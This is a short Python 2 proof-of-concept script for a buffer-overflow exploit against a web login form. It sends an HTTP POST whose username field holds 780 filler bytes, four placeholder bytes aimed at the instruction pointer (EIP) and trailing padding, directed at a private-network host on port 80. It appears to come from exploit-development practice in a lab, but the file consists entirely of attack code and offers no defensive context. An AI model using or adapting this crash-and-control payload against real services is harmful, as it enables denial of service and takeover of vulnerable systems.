#!usr/bin/python

import socket
import time
import sys


try:
	print "Checking...."

	filler = "A" * 780
	eip = "B" * 4
	buffer = "C" * 16

	inputBuffer = filler + eip + buffer

	content = "username=" + inputBuffer + "&password=A"

	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "HOST: 192.168.178.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (x11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0,9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Accept-Encoding: gzip, deflate\r\n"
	buffer += "Referer: http//192.168.178.10/login\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"

	buffer+= content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.178.10", 80))
	s.send(buffer)

	s.close()

	print 'Done! =]'

except:
	print "No Connection --------"
	sys.exit()
